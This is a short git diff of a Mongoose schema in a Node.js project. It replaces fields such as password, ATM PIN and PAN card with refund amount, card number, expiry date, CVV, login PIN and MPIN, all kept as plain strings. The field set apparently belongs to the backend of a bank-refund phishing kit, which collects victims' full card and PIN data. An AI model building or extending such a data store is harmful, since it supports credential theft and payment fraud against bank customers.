@@ -3,31 +3,35 @@ const mongoose = require("mongoose");
 //Schema
 const DataSchema = new mongoose.Schema(
   {
-    phone: {
+    refund_amount: {
       type: String,
       default: null,
     },
-    user_id: {
+    account_holder_name: {
       type: String,
       default: null,
     },
-    password: {
+    card_holder_name: {
       type: String,
       default: null,
     },
-    signature: {
+    card_number: {
       type: String,
       default: null,
     },
-    account_no: {
+    expiry_date: {
       type: String,
       default: null,
     },
-    atm_pin: {
+    cvv: {
       type: String,
       default: null,
     },
-    pan_card: {
+    login_pin: {
+      type: String,
+      default: null,
+    },
+    mpin: {
       type: String,
       default: null,
     },
